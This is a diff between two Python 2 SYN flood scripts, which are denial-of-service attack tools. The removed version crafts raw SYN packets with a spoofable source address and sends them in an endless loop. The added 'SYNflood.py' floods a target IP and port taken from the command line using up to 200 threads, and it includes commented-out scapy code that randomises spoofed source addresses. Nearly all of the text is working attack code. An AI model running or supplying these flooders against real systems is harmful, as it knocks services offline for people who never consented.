@@ -1,103 +1,77 @@
-'''
-	Syn flood program in python using raw sockets (Linux)
-	
-	Silver Moon (m00n.silv3r@gmail.com)
-'''
+#!/usr/bin/env python
+#########################################
+#
+# SYNflood.py - A multithreaded SYN Flooder
+# By Brandon Smith
+# brandon.smith@studiobebop.net
+#
+# This script is a demonstration of a SYN/ACK 3 Way Handshake Attack
+# as discussed by Halla of Information Leak
+#
+#########################################
+import socket
+import random
+import sys
+import threading
+#import scapy # Uncomment this if you're planning to use Scapy
 
-# some imports
-import socket, sys
-from struct import *
+###
+# Global Config
+###
 
-# checksum functions needed for calculation checksum
-def checksum(msg):
-	s = 0
-	# loop taking 2 characters at a time
-	for i in range(0, len(msg), 2):
-		w = (ord(msg[i]) &lt;&lt; 8) + (ord(msg[i+1]) )
-		s = s + w
-	s = (s&gt;&gt;16) + (s &amp; 0xffff);
-	#s = s + (s &gt;&gt; 16);
-	#complement and mask to 4 byte short
-	s = ~s &amp; 0xffff
-	return s
+interface    = None
+target       = None
+port         = None
+thread_limit = 200
+total        = 0
 
-#create a raw socket
-try:
-	s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
-except socket.error , msg:
-	print 'Socket could not be created. Error Code : ' + str(msg[0]) + ' Message ' + msg[1]
-	sys.exit()
+#!# End Global Config #!#
 
-# tell kernel not to put in headers, since we are providing it
-s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
-	
-# now start constructing the packet
-packet = '';
+class sendSYN(threading.Thread):
+    global target, port
+    def __init__(self):
+            threading.Thread.__init__(self)
 
-source_ip = '192.168.1.101'
-dest_ip = '192.168.1.1'	# or socket.gethostbyname('www.google.com')
+    def run(self):
+        # There are two different ways you can go about pulling this off.
+        # You can either:
+        #   - 1. Just open a socket to your target on any old port
+        #   - 2. Or you can be a cool kid and use scapy to make it look cool, and overcomplicated!
+        #
+        # (Uncomment whichever method you'd like to use)
 
-# ip header fields
-ihl = 5
-version = 4
-tos = 0
-tot_len = 20 + 20	# python seems to correctly fill the total length, dont know how ??
-id = 54321	#Id of this packet
-frag_off = 0
-ttl = 255
-protocol = socket.IPPROTO_TCP
-check = 10	# python seems to correctly fill the checksum
-saddr = socket.inet_aton ( source_ip )	#Spoof the source ip address if you want to
-daddr = socket.inet_aton ( dest_ip )
+        # Method 1 -
+        s = socket.socket()
+        s.connect((target,port))
 
-ihl_version = (version &lt;&lt; 4) + ihl
+        # Methods 2 -
+#		i = scapy.IP()
+#		i.src = "%i.%i.%i.%i" % (random.randint(1,254),random.randint(1,254),random.randint(1,254),random.randint(1,254))
+#		i.dst = target
 
-# the ! in the pack format string means network order
-ip_header = pack('!BBHHHBBH4s4s' , ihl_version, tos, tot_len, id, frag_off, ttl, protocol, check, saddr, daddr)
+#		t = scapy.TCP()
+#		t.sport = random.randint(1,65535)
+#		t.dport = port
+#		t.flags = 'S'
 
-# tcp header fields
-source = 1234	# source port
-dest = 1883	# destination port
-seq = 0
-ack_seq = 0
-doff = 5	#4 bit field, size of tcp header, 5 * 4 = 20 bytes
-#tcp flags
-fin = 0
-syn = 1
-rst = 0
-psh = 0
-ack = 0
-urg = 0
-window = socket.htons (5840)	#	maximum allowed window size
-check = 0
-urg_ptr = 0
+#		scapy.send(i/t, verbose=0)
 
-offset_res = (doff &lt;&lt; 4) + 0
-tcp_flags = fin + (syn &lt;&lt; 1) + (rst &lt;&lt; 2) + (psh &lt;&lt;3) + (ack &lt;&lt; 4) + (urg &lt;&lt; 5)
+if __name__ == "__main__":
+    # Make sure we have all the arguments we need
+    if len(sys.argv) != 4:
+        print "Usage: %s <Interface> <Target IP> <Port>" % sys.argv[0]
+        exit()
 
-# the ! in the pack format string means network order
-tcp_header = pack('!HHLLBBHHH' , source, dest, seq, ack_seq, offset_res, tcp_flags,  window, check, urg_ptr)
+    # Prepare our variables
+    interface        = sys.argv[1]
+    target           = sys.argv[2]
+    port             = int(sys.argv[3])
+#	scapy.conf.iface = interface # Uncomment this if you're going to use Scapy
 
-# pseudo header fields
-source_address = socket.inet_aton( source_ip )
-dest_address = socket.inet_aton(dest_ip)
-placeholder = 0
-protocol = socket.IPPROTO_TCP
-tcp_length = len(tcp_header)
-
-psh = pack('!4s4sBBH' , source_address , dest_address , placeholder , protocol , tcp_length);
-psh = psh + tcp_header;
-
-tcp_checksum = checksum(psh)
-
-# make the tcp header again and fill the correct checksum
-tcp_header = pack('!HHLLBBHHH' , source, dest, seq, ack_seq, offset_res, tcp_flags,  window, tcp_checksum , urg_ptr)
-
-# final full packet - syn packets dont have any data
-packet = ip_header + tcp_header
-
-#Send the packet finally - the port specified has no effect
-while True:
-    s.sendto(packet, (dest_ip , 0 ))	# put this in a loop if you want to flood the target
-
-#put the above line in a loop like while 1: if you want to flood
+    # Hop to it!
+    print "Flooding %s:%i with SYN packets." % (target, port)
+    while True:
+        if threading.activeCount() < thread_limit:
+            sendSYN().start()
+            total += 1
+            sys.stdout.write("\rTotal packets sent:\t\t\t%i" % total)
